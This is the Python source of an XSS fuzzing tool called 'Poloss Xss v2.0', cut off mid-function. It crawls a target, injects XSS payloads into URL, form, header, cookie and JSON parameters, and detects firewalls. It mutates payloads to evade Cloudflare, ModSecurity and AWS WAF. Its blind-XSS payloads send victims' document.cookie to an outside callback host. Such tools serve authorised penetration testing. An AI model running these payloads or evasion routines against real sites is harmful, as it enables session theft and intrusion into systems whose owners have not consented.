#!/usr/bin/env python3

import requests
import re
import html
import urllib.parse
import time
import sys
import threading
import queue
import json
import hashlib
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
from collections import OrderedDict, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import logging
import colorama
from colorama import Fore, Style, Back

# Initialize colorama
colorama.init(autoreset=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('xss_fuzzer.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

class AdvancedXSSFuzzer:
    def __init__(self, target_url, options=None):
        """
        Initialize Advanced Poloss Xss
        
        Args:
            target_url (str): Target URL
            options (dict): Configuration options
        """
        self.target_url = target_url
        self.options = options or {}
        
        # Session setup
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        })
        
        # Results storage
        self.discovered_params = {
            'url': [],
            'form': [],
            'header': [],
            'json': [],
            'cookie': [],
            'file': []
        }
        
        self.vulnerabilities = []
        self.waf_detected = None
        self.injection_points = []
        self.payload_history = {}
        
        # Payload databases
        self.init_payload_db()
        
        # Statistics
        self.stats = {
            'requests_sent': 0,
            'parameters_tested': 0,
            'vulnerabilities_found': 0,
            'waf_blocks': 0,
            'time_elapsed': 0
        }
        
        # Threading
        self.thread_pool = ThreadPoolExecutor(max_workers=self.options.get('threads', 10))
        self.request_queue = queue.Queue()
        self.results_queue = queue.Queue()
        
        # Blind XSS
        self.blind_callback_url = self.options.get('blind_callback')
        self.blind_detected = []
        
        # DOM analysis
        self.dom_sinks = [
            'document.write',
            'document.writeln',
            'innerHTML',
            'outerHTML',
            'eval',
            'setTimeout',
            'setInterval',
            'Function',
            'location',
            'window.name',
            'postMessage',
            'localStorage',
            'sessionStorage'
        ]
        
    def init_payload_db(self):
        """Initialize payload database"""
        self.payload_db = {
            # Basic XSS payloads
            'basic': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '<embed src="javascript:alert(1)">',
                '<object data="javascript:alert(1)">',
            ],
            
            # Attribute context payloads
            'attribute': [
                '" autofocus onfocus=alert(1)',
                "' onmouseover=alert(1)",
                '` onload=alert(1)',
                '" onerror=alert(1)',
                "javascript:alert(1)",
            ],
            
            # JavaScript context payloads
            'javascript': [
                '";alert(1);//',
                "';alert(1);//",
                '`;alert(1);//',
                '</script><script>alert(1)</script>',
                '\\";alert(1);//',
            ],
            
            # URL context payloads
            'url': [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'jav&#x61;script:alert(1)',
                'jav&#x09;ascript:alert(1)',
                'jav&#x0a;ascript:alert(1)',
            ],
            
            # DOM-based payloads
            'dom': [
                '#<script>alert(1)</script>',
                '?param=<script>alert(1)</script>',
                '&param=<script>alert(1)</script>',
                '#\"onload=\"alert(1)',
            ],
            
            # Blind XSS payloads
            'blind': [
                '<script>fetch(\'http://blind.xss.ht?c=\'+document.cookie)</script>',
                '<img src=x onerror="fetch(\'http://blind.xss.ht?c=\'+document.cookie)">',
                '<script>new Image().src=\'http://blind.xss.ht?c=\'+document.cookie;</script>',
            ],
            
            # WAF bypass payloads
            'waf_bypass': [
                '<script>prompt`1`</script>',
                '<img src=x onerror=alert`1`>',
                '<svg/onload=alert(1)>',
                '<svg onload=alert&lpar;1&rpar;>',
                '<script>alert`${1}`</script>',
                '<img src=x oneonerrorrror=alert(1)>',
                '<script>alert(1)</script\x00>',
                '<script>alert(1)</script\x0a>',
                '<script>alert(1)</script\x0d>',
            ]
        }
        
    def print_banner(self):
        """Display tool banner"""
        banner = f"""
{Fore.CYAN}{'='*80}
{Fore.YELLOW}
██████╗  ██████╗ ██╗      ██████╗ ███████╗███████╗    
██╔══██╗██╔═══██╗██║     ██╔═══██╗██╔════╝██╔════╝    
██████╔╝██║   ██║██║     ██║   ██║███████╗███████╗    
██╔═══╝ ██║   ██║██║     ██║   ██║╚════██║╚════██║
██║     ╚██████╔╝███████╗╚██████╔╝███████║███████║
╚═╝      ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚══════╝
{Fore.GREEN}                          Poloss Xss v2.0
{Fore.CYAN}                   White Hat Cyber International Grade
{'='*80}
{Fore.RESET}
[+] Target: {self.target_url}
[+] Threads: {self.options.get('threads', 10)}
[+] Timeout: {self.options.get('timeout', 10)}s
[+] Mode: {self.options.get('mode', 'comprehensive')}
{Fore.CYAN}{'='*80}{Fore.RESET}
"""
        print(banner)
    
    # ==============================
    # 1. PARAMETER MINING ENGINE
    # ==============================
    
    def mine_parameters(self):
        """
        Advanced parameter mining from all sources
        Returns: Dict of discovered parameters
        """
        print(f"\n{Fore.GREEN}[1] PARAMETER MINING ENGINE{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*60}{Fore.RESET}")
        
        try:
            # Initial request
            response = self.session.get(self.target_url, timeout=self.options.get('timeout', 10))
            self.stats['requests_sent'] += 1
            
            # Extract from URL
            self.extract_url_parameters(response.url)
            
            # Extract from forms
            self.extract_form_parameters(response.text)
            
            # Extract from headers
            self.extract_header_parameters()
            
            # Extract from JSON
            self.extract_json_parameters(response)
            
            # Extract from cookies
            self.extract_cookie_parameters()
            
            # Extract from file uploads
            self.extract_file_parameters(response.text)
            
            # Crawl for more parameters (optional)
            if self.options.get('crawl', True):
                self.crawl_for_parameters(response.text)
            
            # Display results
            self.display_parameter_summary()
            
            return self.discovered_params
            
        except Exception as e:
            logger.error(f"Parameter mining failed: {e}")
            return {}
    
    def extract_url_parameters(self, url):
        """Extract parameters from URL"""
        parsed = urlparse(url)
        
        # Query parameters
        query_params = parse_qs(parsed.query)
        for param in query_params:
            if param not in self.discovered_params['url']:
                self.discovered_params['url'].append({
                    'name': param,
                    'value': query_params[param][0],
                    'type': 'query'
                })
        
        # Path parameters
        path_segments = parsed.path.split('/')
        for i, segment in enumerate(path_segments):
            if segment and any(c.isdigit() for c in segment):
                param_name = f'path_param_{i}'
                self.discovered_params['url'].append({
                    'name': param_name,
                    'value': segment,
                    'type': 'path'
                })
    
    def extract_form_parameters(self, html_content):
        """Extract parameters from forms"""
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for form in soup.find_all('form'):
            form_action = form.get('action', '')
            form_method = form.get('method', 'get').lower()
            
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                param_name = input_tag.get('name')
                if not param_name:
                    continue
                
                param_type = input_tag.get('type', 'text')
                param_value = input_tag.get('value', '')
                
                param_info = {
                    'name': param_name,
                    'value': param_value,
                    'type': param_type,
                    'form_action': form_action,
                    'form_method': form_method
                }
                
                # Classify parameter type
                if param_type in ['file', 'image']:
                    self.discovered_params['file'].append(param_info)
                elif param_type in ['hidden', 'submit', 'button']:
                    continue  # Skip non-injectable types
                else:
                    self.discovered_params['form'].append(param_info)
    
    def extract_header_parameters(self):
        """Extract injectable headers"""
        injectable_headers = [
            'User-Agent',
            'Referer',
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Forwarded-Host',
            'Origin',
            'X-Requested-With'
        ]
        
        for header in injectable_headers:
            self.discovered_params['header'].append({
                'name': header,
                'value': '',
                'type': 'header'
            })
    
    def extract_json_parameters(self, response):
        """Extract parameters from JSON responses"""
        content_type = response.headers.get('Content-Type', '').lower()
        
        if 'application/json' in content_type:
            try:
                json_data = response.json()
                self.extract_from_json(json_data, 'root')
            except:
                pass
    
    def extract_from_json(self, data, path):
        """Recursively extract parameters from JSON"""
        if isinstance(data, dict):
            for key, value in data.items():
                new_path = f"{path}.{key}" if path != 'root' else key
                if isinstance(value, (str, int, float, bool)):
                    self.discovered_params['json'].append({
                        'name': new_path,
                        'value': str(value),
                        'type': 'json'
                    })
                else:
                    self.extract_from_json(value, new_path)
        elif isinstance(data, list):
            for i, item in enumerate(data):
                self.extract_from_json(item, f"{path}[{i}]")
    
    def extract_cookie_parameters(self):
        """Extract cookie parameters"""
        cookies = self.session.cookies.get_dict()
        
        for cookie_name in cookies:
            self.discovered_params['cookie'].append({
                'name': cookie_name,
                'value': cookies[cookie_name],
                'type': 'cookie'
            })
    
    def extract_file_parameters(self, html_content):
        """Extract file upload parameters"""
        soup = BeautifulSoup(html_content, 'html.parser')
        
        file_inputs = soup.find_all('input', {'type': 'file'})
        for inp in file_inputs:
            param_name = inp.get('name')
            if param_name:
                self.discovered_params['file'].append({
                    'name': param_name,
                    'value': '',
                    'type': 'file',
                    'accept': inp.get('accept', '')
                })
    
    def crawl_for_parameters(self, html_content):
        """Crawl for additional parameters"""
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Find all links
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href.startswith(('http://', 'https://', '//', '/')):
                try:
                    # Follow internal links
                    if not href.startswith(('http://', 'https://')):
                        href = urllib.parse.urljoin(self.target_url, href)
                    
                    # Skip external domains
                    if urllib.parse.urlparse(href).netloc != urllib.parse.urlparse(self.target_url).netloc:
                        continue
                    
                    # Request the page
                    resp = self.session.get(href, timeout=5)
                    self.stats['requests_sent'] += 1
                    
                    # Extract parameters from new page
                    self.extract_form_parameters(resp.text)
                    self.extract_url_parameters(resp.url)
                    
                except:
                    continue
    
    def display_parameter_summary(self):
        """Display discovered parameters summary"""
        total_params = sum(len(params) for params in self.discovered_params.values())
        
        print(f"[+] Total Parameters Found: {Fore.GREEN}{total_params}{Fore.RESET}")
        print(f"    ├── URL Parameters: {len(self.discovered_params['url'])}")
        print(f"    ├── Form Parameters: {len(self.discovered_params['form'])}")
        print(f"    ├── Header Parameters: {len(self.discovered_params['header'])}")
        print(f"    ├── JSON Parameters: {len(self.discovered_params['json'])}")
        print(f"    ├── Cookie Parameters: {len(self.discovered_params['cookie'])}")
        print(f"    └── File Parameters: {len(self.discovered_params['file'])}")
        
        # Print sample parameters
        if self.options.get('verbose'):
            for param_type, params in self.discovered_params.items():
                if params:
                    print(f"\n{Fore.YELLOW}[*] {param_type.upper()} Parameters:{Fore.RESET}")
                    for param in params[:5]:  # Show first 5
                        print(f"    • {param['name']} = {param['value'][:50]}")
                    if len(params) > 5:
                        print(f"    ... and {len(params)-5} more")
    
    # ==============================
    # 2. SMART REFLECTED POINT DETECTION
    # ==============================
    
    def detect_reflection_points(self, param_name, test_value, response_text):
        """
        Detect where the payload appears in response
        Returns: List of reflection contexts
        """
        reflection_contexts = []
        
        # Generate unique test marker
        marker = f"XSS_TEST_{random.randint(1000, 9999)}"
        
        # Check different contexts
        contexts_to_check = [
            ('html_body', f'>{marker}<'),
            ('html_comment', f'<!--{marker}-->'),
            ('html_attribute', f'"{marker}"'),
            ('html_attribute_single', f"'{marker}'"),
            ('javascript_string', f'"{marker}"'),
            ('javascript_string_single', f"'{marker}'"),
            ('javascript_template', f'`{marker}`'),
            ('url', marker),
            ('css', f'{{color:{marker}}}'),
        ]
        
        # Replace marker with actual test value in contexts
        reflection_patterns = {
            'html_body': r'>[^<]*' + re.escape(test_value) + r'[^<]*<',
            'html_comment': r'<!--[^-]*' + re.escape(test_value) + r'[^-]*-->',
            'html_attribute': r'"[^"]*' + re.escape(test_value) + r'[^"]*"',
            'html_attribute_single': r"'[^']*" + re.escape(test_value) + r"[^']*'",
            'javascript_string': r'"[^"]*' + re.escape(test_value) + r'[^"]*"',
            'javascript_string_single': r"'[^']*" + re.escape(test_value) + r"[^']*'",
            'javascript_template': r'`[^`]*' + re.escape(test_value) + r'[^`]*`',
            'url': r'(?:href|src|action)\s*=\s*["\'][^"\']*' + re.escape(test_value) + r'[^"\']*["\']',
            'css': r'style\s*=\s*["\'][^"\']*' + re.escape(test_value) + r'[^"\']*["\']',
        }
        
        for context_name, pattern in reflection_patterns.items():
            matches = re.finditer(pattern, response_text, re.IGNORECASE | re.DOTALL)
            for match in matches:
                reflection_contexts.append({
                    'context': context_name,
                    'position': match.start(),
                    'snippet': match.group()[:100],
                    'raw_match': match.group()
                })
        
        # Also check for direct reflection
        if test_value in response_text:
            reflection_contexts.append({
                'context': 'direct',
                'position': response_text.find(test_value),
                'snippet': test_value,
                'raw_match': test_value
            })
        
        return reflection_contexts
    
    # ==============================
    # 3. PAYLOAD MUTATION ENGINE
    # ==============================
    
    class PayloadMutator:
        """Advanced payload mutation engine"""
        
        @staticmethod
        def mutate_based_on_context(base_payload, context):
            """Mutate payload based on injection context"""
            mutations = []
            
            if context == 'html_body':
                mutations = [
                    base_payload,
                    f'>{base_payload}<',
                    f'</title>{base_payload}',
                    f'</style>{base_payload}',
                    f'<div>{base_payload}</div>',
                ]
            elif context == 'html_attribute':
                mutations = [
                    f'"{base_payload}"',
                    f"'{base_payload}'",
                    f'`{base_payload}`',
                    f'" {base_payload}',
                    f"' {base_payload}",
                    f'"{base_payload}',
                    f"'{base_payload}",
                ]
            elif context == 'javascript':
                mutations = [
                    f'"{base_payload}"',
                    f"'{base_payload}'",
                    f'`{base_payload}`',
                    f'";{base_payload};//',
                    f"';{base_payload};//",
                    f'`;{base_payload};//',
                    f'\\"{base_payload}\\""',
                ]
            elif context == 'url':
                mutations = [
                    f'javascript:{base_payload}',
                    f'data:text/html,{base_payload}',
                    f'jav&#x61;script:{base_payload}',
                    f'jav&#x09;ascript:{base_payload}',
                ]
            
            return mutations
        
        @staticmethod
        def apply_waf_bypass(payload, waf_type=None):
            """Apply WAF bypass techniques"""
            bypassed_payloads = []
            
            # Common WAF bypass techniques
            techniques = [
                # Case variation
                lambda p: p.upper(),
                lambda p: p.lower(),
                lambda p: p.title(),
                lambda p: p.swapcase(),
                
                # HTML encoding
                lambda p: p.replace('<', '&lt;').replace('>', '&gt;'),
                lambda p: p.replace('<', '%3C').replace('>', '%3E'),
                lambda p: p.replace('<', '&LT;').replace('>', '&GT;'),
                
                # Unicode encoding
                lambda p: ''.join([f'\\u{ord(c):04x}' for c in p]),
                lambda p: ''.join([f'&#x{ord(c):x};' for c in p]),
                lambda p: ''.join([f'&#{ord(c)};' for c in p]),
                
                # Double encoding
                lambda p: quote(quote(p)),
                
                # Null bytes
                lambda p: p.replace('>', '%00>'),
                lambda p: p.replace('<', '<%00'),
                
                # Whitespace variations
                lambda p: p.replace(' ', '\t'),
                lambda p: p.replace(' ', '\n'),
                lambda p: p.replace(' ', '\r'),
                lambda p: p.replace(' ', '/* */'),
                
                # Comment splitting
                lambda p: p.replace('script', 'scr/**/ipt'),
                lambda p: p.replace('onload', 'on/**/load'),
                
                # Overlong UTF-8
                lambda p: p.replace('<', '%C0%BC'),
                lambda p: p.replace('>', '%C0%BE'),
            ]
            
            # WAF-specific bypasses
            if waf_type == 'Cloudflare':
                techniques.extend([
                    lambda p: p.replace('script', 'scr\u0131pt'),
                    lambda p: p.replace('onload', 'on\u0131oad'),
                    lambda p: p.replace('alert', 'al\u0065rt'),
                ])
            elif waf_type == 'ModSecurity':
                techniques.extend([
                    lambda p: p + '/*' + 'A'*500 + '*/',
                    lambda p: '<>' + p,
                    lambda p: p.replace(' ', '/**/'),
                ])
            elif waf_type == 'AWS WAF':
                techniques.extend([
                    lambda p: p.replace('<', '<>'),
                    lambda p: p.replace('>', '>>'),
                    lambda p: p.replace('script', 'scr\ript'),
                ])
            
            for technique in techniques:
                try:
                    bypassed = technique(payload)
                    if bypassed not in bypassed_payloads:
                        bypassed_payloads.append(bypassed)
                except:
                    continue
            
            return bypassed_payloads
        
        @staticmethod
        def generate_polyglot_payload():
            """Generate polyglot XSS payloads"""
            polyglots = [
                # JavaScript/HTML polyglot
                '"><img src=x onerror=alert(1)>',
                "';alert(1)//';alert(1)//\";alert(1)//\";alert(1)//--></SCRIPT>\">'>\"><SCRIPT>alert(1)</SCRIPT>",
                
                # Multi-context polyglot
                'javascript:\'/*"/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert(1)//',
                
                # Universal polyglot
                '\'"></textarea></noscript></title></style><svg/onload=alert(1)>',
            ]
            
            return polyglots
        
        @staticmethod
        def mutate_for_filter(filter_pattern, payload):
            """Mutate payload to bypass specific filters"""
            mutations = []
            
            # If filter blocks "script"
            if re.search(r'script', filter_pattern, re.I):
                mutations.extend([
                    payload.replace('script', 'scr&#x69;pt'),
                    payload.replace('script', 'scr\u0069pt'),
                    payload.replace('script', 'scr/**/ipt'),
                    payload.replace('script', 'scr\ript'),
                    payload.replace('script', 'scr<scr>ipt</scr>ipt'),
                ])
            
            # If filter blocks "onload"
            if re.search(r'onload', filter_pattern, re.I):
                mutations.extend([
                    payload.replace('onload', 'on\u006c\u006f\u0061\u0064'),
                    payload.replace('onload', 'onlo\u0061d'),
                    payload.replace('onload', 'onlo/**/ad'),
                ])
            
            # If filter blocks "alert"
            if re.search(r'alert', filter_pattern, re.I):
                mutations.extend([
                    payload.replace('alert', 'al\u0065rt'),
                    payload.replace('alert', 'al/**/ert'),
                    payload.replace('alert', 'prompt'),
                    payload.replace('alert', 'confirm'),
                ])
            
            return mutations
    
    # ==============================
    # 4. TESTING MODE IMPLEMENTATION
    # ==============================
    
    def test_parameter(self, param_info, test_mode='classic'):
        """
        Test a single parameter for XSS vulnerabilities
        
        Args:
            param_info: Parameter information dict
            test_mode: 'classic', 'dom', or 'blind'
        
        Returns: Vulnerability dict if found, None otherwise
        """
        param_name = param_info['name']
        param_type = param_info.get('type', 'url')
        
        print(f"  [~] Testing {param_type} parameter: {param_name}")
        
        # Select payloads based on test mode
        if test_mode == 'classic':
            payloads = self.get_classic_payloads(param_info)
        elif test_mode == 'dom':
            payloads = self.get_dom_payloads(param_info)
        elif test_mode == 'blind':
            payloads = self.get_blind_payloads(param_info)
        else:
            payloads = self.get_classic_payloads(param_info)
        
        # Test each payload
        for payload in payloads:
            try:
                # Send request with payload
                response = self.send_request_with_payload(param_info, payload)
                self.stats['requests_sent'] += 1
                
                # Check for WAF blocking
                if self.is_waf_blocked(response):
                    self.stats['waf_blocks'] += 1
                    print(f"    {Fore.YELLOW}[!] WAF Blocked{Fore.RESET}")
                    
                    # Try WAF bypass
                    bypass_payloads = self.PayloadMutator.apply_waf_bypass(payload, self.waf_detected)
                    for bypass_payload in bypass_payloads[:3]:  # Try first 3 bypasses
                        bypass_response = self.send_request_with_payload(param_info, bypass_payload)
                        if not self.is_waf_blocked(bypass_response):
                            payload = bypass_payload
                            response = bypass_response
                            break
                
                # Detect reflection points
                reflection_contexts = self.detect_reflection_points(param_name, payload, response.text)
                
                if reflection_contexts:
                    # Analyze if reflection is exploitable
                    for context in reflection_contexts:
                        if self.is_exploitable(context, payload, response.text):
                            vulnerability = self.create_vulnerability_record(
                                param_info, payload, context, response
                            )
                            
                            # Verify the vulnerability
                            if self.verify_vulnerability(vulnerability):
                                return vulnerability
                
                # DOM analysis for DOM-based XSS
                if test_mode in ['classic', 'dom']:
                    dom_vulns = self.analyze_dom(response.text, param_name, payload)
                    if dom_vulns:
                        return dom_vulns[0]  # Return first DOM vulnerability
                
                # Rate limiting
                time.sleep(self.options.get('delay', 0.1))
                
            except Exception as e:
                logger.debug(f"Error testing payload {payload[:50]}: {e}")
                continue
        
        return None
    
    def get_classic_payloads(self, param_info):
        """Get classic XSS payloads for parameter"""
        payloads = []
        
        # Context-aware payload selection
        param_type = param_info.get('type', 'url')
        
        if param_type in ['url', 'query', 'path']:
            payloads.extend(self.payload_db['url'])
            payloads.extend(self.payload_db['basic'])
        elif param_type in ['form', 'text', 'textarea', 'search']:
            payloads.extend(self.payload_db['basic'])
            payloads.extend(self.payload_db['attribute'])
        elif param_type == 'header':
            payloads.extend(self.payload_db['basic'])
            payloads.extend(self.payload_db['waf_bypass'])
        
        # Add polyglot payloads
        payloads.extend(self.PayloadMutator.generate_polyglot_payload())
        
        return list(OrderedDict.fromkeys(payloads))[:50]  # Deduplicate and limit
    
    def get_dom_payloads(self, param_info):
        """Get DOM-based XSS payloads"""
        payloads = self.payload_db['dom']
        
        # Add DOM-specific payloads
        dom_payloads = [
            '#<img src=x onerror=alert(1)>',
            '?test=<script>alert(1)</script>',
            '&test=<script>alert(1)</script>',
            '#"onload="alert(1)',
            "javascript:alert(document.domain)",
            "data:text/html,<script>alert(1)</script>",
        ]
        
        payloads.extend(dom_payloads)
        return payloads
    
    def get_blind_payloads(self, param_info):
        """Get blind XSS payloads"""
        if not self.blind_callback_url:
            # Use default blind XSS payloads
            return self.payload_db['blind']
        
        # Generate payloads with callback URL
        callback_domain = self.blind_callback_url
        payloads = [
            f'<script>fetch(\'{callback_domain}?c=\'+document.cookie)</script>',
            f'<img src=x onerror="fetch(\'{callback_domain}?c=\'+document.cookie)">',
            f'<script>new Image().src=\'{callback_domain}?c=\'+document.cookie;</script>',
            f'<script>navigator.sendBeacon(\'{callback_domain}\', document.cookie)</script>',
        ]
        
        return payloads
    
    def send_request_with_payload(self, param_info, payload):
        """Send request with injected payload"""
        param_name = param_info['name']
        param_type = param_info.get('type', 'url')
        
        if param_type in ['url', 'query', 'path']:
            # URL parameter injection
            parsed_url = urlparse(self.target_url)
            query_params = parse_qs(parsed_url.query)
            
            # Update the target parameter
            if param_name in query_params:
                query_params[param_name] = [payload]
            else:
                # For path parameters
                url_with_payload = self.target_url.replace(
                    param_info.get('value', ''),
                    payload
                )
                return self.session.get(url_with_payload, timeout=self.options.get('timeout', 10))
            
            # Reconstruct URL
            new_query = urlencode(query_params, doseq=True)
            target_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            return self.session.get(target_url, timeout=self.options.get('timeout', 10))
        
        elif param_type == 'form':
            # Form parameter injection
            form_method = param_info.get('form_method', 'get').lower()
            form_action = param_info.get('form_action', self.target_url)
            
            if form_action and not form_action.startswith(('http://', 'https://')):
                form_action = urllib.parse.urljoin(self.target_url, form_action)
            
            data = {param_name: payload}
            
            if form_method == 'post':
                return self.session.post(form_action, data=data, timeout=self.options.get('timeout', 10))
            else:
                return self.session.get(form_action, params=data, timeout=self.options.get('timeout', 10))
        
        elif param_type == 'header':
            # Header injection
            headers = {param_name: payload}
            return self.session.get(self.target_url, headers=headers, timeout=self.options.get('timeout', 10))
        
        elif param_type == 'cookie':
            # Cookie injection
            self.session.cookies.set(param_name, payload)
            return self.session.get(self.target_url, timeout=self.options.get('timeout', 10))
        
        elif param_type == 'json':
            # JSON parameter injection
            # This is simplified - in reality would need to parse and rebuild JSON
            data = {param_name: payload}
            headers = {'Content-Type': 'application/json'}
            return self.session.post(self.target_url, json=data, headers=headers, timeout=self.options.get('timeout', 10))
        
        # Default fallback
        return self.session.get(self.target_url, timeout=self.options.get('timeout', 10))
    
    # ==============================
    # 5. RACE TESTING / CONCURRENCY
    # ==============================
    
    def concurrent_testing(self, parameters, test_mode='classic'):
        """Test multiple parameters concurrently"""
        print(f"\n{Fore.GREEN}[5] CONCURRENT TESTING ENGINE{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*60}{Fore.RESET}")
        
        vulnerabilities = []
        futures = []
        
        # Submit tasks to thread pool
        for param_info in parameters:
            future = self.thread_pool.submit(self.test_parameter, param_info, test_mode)
            futures.append(future)
        
        # Collect results
        completed = 0
        for future in as_completed(futures):
            completed += 1
            result = future.result()
            
            if result:
                vulnerabilities.append(result)
                self.display_vulnerability(result)
            
            # Progress indicator
            print(f"\r    Progress: {completed}/{len(parameters)} parameters", end='', flush=True)
        
        print()  # New line after progress
        
        return vulnerabilities
    
    # ==============================
    # 6. WAF DETECTION & BYPASS
    # ==============================
    
    def detect_waf(self):
        """Detect WAF presence"""
        print(f"\n{Fore.GREEN}[6] WAF DETECTION{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*60}{Fore.RESET}")
        
        test_payloads = [
            '<script>alert(1)</script>',
            '../../../../etc/passwd',
            "' OR '1'='1",
            '<svg onload=alert(1)>',
        ]
        
        for payload in test_payloads:
            try:
                response = self.session.get(self.target_url, params={'test': payload}, timeout=5)
                
                # Check WAF indicators
                waf_indicators = {
                    'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
                    'ModSecurity': ['mod_security', 'libmodsecurity'],
                    'AWS WAF': ['aws', 'awselb/2.0'],
                    'Akamai': ['akamai', 'akamaighost'],
                    'Imperva': ['imperva', 'incapsula'],
                    'F5 BIG-IP': ['bigip', 'f5'],
                    'FortiWeb': ['fortiweb', 'fortinet'],
                    'Barracuda': ['barracuda'],
                    'Sucuri': ['sucuri'],
                }
                
                for waf, indicators in waf_indicators.items():
                    for indicator in indicators:
                        if indicator.lower() in response.headers.get('server', '').lower():
                            self.waf_detected = waf
                            print(f"[!] {Fore.YELLOW}WAF Detected: {waf}{Fore.RESET}")
                            return waf
                        
                        if indicator.lower() in response.text.lower():
                            self.waf_detected = waf
                            print(f"[!] {Fore.YELLOW}WAF Detected: {waf}{Fore.RESET}")
                            return waf
                
                # Check status codes
                if response.status_code in [403, 406, 419, 429, 500, 501, 503]:
                    print(f"[!] {Fore.YELLOW}Possible WAF Blocking (HTTP {response.status_code}){Fore.RESET}")
                    self.waf_detected = "Generic WAF"
                    return "Generic WAF"
                
            except Exception as e:
                continue
        
        print(f"[+] {Fore.GREEN}No WAF detected{Fore.RESET}")
        return None
    
    def is_waf_blocked(self, response):
        """Check if response indicates WAF blocking"""
        blocking_indicators = [
            (403, "Forbidden"),
            (406, "Not Acceptable"),
            (419, "Page Expired"),
            (429, "Too Many Requests"),
            (500, "Internal Server Error"),
            (501, "Not Implemented"),
            (503, "Service Unavailable"),
        ]
        
        for code, phrase in blocking_indicators:
            if response.status_code == code:
                return True
        
        # Check for WAF-specific block pages
        block_patterns = [
            r'access denied',
            r'blocked',
            r'security.+\Wviolation',
            r'forbidden',
            r'malicious',
            r'suspicious',
            r'not acceptable',
        ]
        
        for pattern in block_patterns:
            if re.search(pattern, response.text, re.I):
                return True
        
        return False
    
    # ==============================
    # 7. VULNERABILITY VERIFICATION
    # ==============================
    
    def verify_vulnerability(self, vulnerability):
        """Verify that a vulnerability is real (not false positive)"""
        print(f"    {Fore.CYAN}[*] Verifying vulnerability...{Fore.RESET}")
        
        param_info = vulnerability['parameter']
        payload = vulnerability['payload']
        
        # Send verification requests with different payloads
        verification_payloads = [
            '<img src=x onerror=console.log("XSS_VERIFIED")>',
            '<script>console.log("XSS_VERIFIED")</script>',
            '" onfocus=console.log("XSS_VERIFIED") autofocus',
            'javascript:console.log("XSS_VERIFIED")',
            '<svg onload=console.log("XSS_VERIFIED")>',
        ]
        
        for ver_payload in verification_payloads:
            try:
                response = self.send_request_with_payload(param_info, ver_payload)
                
                # Check for successful injection
                if self.is_exploitable(vulnerability['context'], ver_payload, response.text):
                    print(f"    {Fore.GREEN}[✓] Vulnerability verified{Fore.RESET}")
                    return True
                
            except Exception as e:
                continue
        
        print(f"    {Fore.YELLOW}[!] Could not verify vulnerability{Fore.RESET}")
        return False
    
    def is_exploitable(self, context, payload, response_text):
        """Check if reflection context is exploitable"""
        # Check if payload is in dangerous context
        if context['context'] == 'html_body':
            # Check if payload is not inside HTML comment
            if '<!--' in response_text and '-->' in response_text:
                # Check if payload is between comment markers
                comment_start = response_text.rfind('<!--', 0, context['position'])
                comment_end = response_text.find('-->', context['position'])
                if comment_start != -1 and comment_end != -1 and comment_start < context['position'] < comment_end:
                    return False  # Inside comment, not exploitable
            
            # Check if payload is inside script tag (good for XSS)
            if '<script' in response_text and '</script>' in response_text:
                script_start = response_text.rfind('<script', 0, context['position'])
                script_end = response_text.find('</script>', context['position'])
                if script_start != -1 and script_end != -1 and script_start < context['position'] < script_end:
                    return True  # Inside script tag, likely exploitable
        
        # Check attribute context
        elif context['context'] in ['html_attribute', 'html_attribute_single']:
            # Check if attribute is event handler
            event_handlers = ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onblur']
            for handler in event_handlers:
                if handler in context['raw_match'].lower():
                    return True
        
        # Check JavaScript context
        elif context['context'] in ['javascript_string', 'javascript_string_single', 'javascript_template']:
            # Inside JavaScript string - check if we can break out
            if any(breakout in payload for breakout in ['";', "';", '`;']):
                return True
        
        # Default: consider exploitable if payload appears
        return True
    
    # ==============================
    # 8. DOM ANALYSIS ENGINE
    # ==============================
    
    def analyze_dom(self, html_content, param_name, payload):
        """Analyze DOM for potential XSS sinks"""
        vulnerabilities = []
        
        # Parse HTML with BeautifulSoup
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Find all script tags
        for script in soup.find_all('script'):
            script_content = script.string
            if not script_content:
                continue
            
            # Check for DOM sinks with our parameter
            for sink in self.dom_sinks:
                pattern = rf'{sink}\s*\([^)]*{re.escape(param_name)}[^)]*\)'
                if re.search(pattern, script_content, re.I):
                    vulnerability = {
                        'type': 'DOM-based XSS',
                        'parameter': param_name,
                        'payload': payload,
                        'context': 'DOM Sink',
                        'sink': sink,
                        'confidence': 'high'
                    }
                    vulnerabilities.append(vulnerability)
        
        # Find inline event handlers
        for tag in soup.find_all(True):  # All tags
            for attr, value in tag.attrs.items():
                if isinstance(value, str) and param_name in value:
                    if attr.startswith('on'):  # Event handler
                        vulnerability = {
                            'type': 'DOM-based XSS',
                            'parameter': param_name,
                            'payload': payload,
                            'context': 'Event Handler',
